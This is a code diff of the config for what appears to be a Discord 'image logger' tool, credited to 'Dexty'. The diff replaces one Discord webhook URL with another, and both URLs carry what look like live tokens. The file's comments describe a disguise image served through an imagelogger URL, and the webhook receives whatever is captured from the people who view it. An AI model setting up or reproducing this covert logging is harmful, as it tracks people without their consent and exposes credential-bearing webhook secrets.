@@ -12,7 +12,7 @@ __author__ = "Dexty"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1376630702740865044/PiSyJNVCHpyH9XbCtvuUTJOX_sUiAHFXMWeViU2KSrdwoADXjkxVvx-qFzheqN8sTc4E",
+    "webhook": "https://discord.com/api/webhooks/1376654201597202575/KmZNMF_bxKrzp61kcE8UV3IMENxkJ5Dhw8NBsJ2qkgSmE3aGE60xstp1w8huLcJqTy54",
     "image": "https://wallpapers.com/images/featured/xp-background-nhvtxpop808oaye4.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
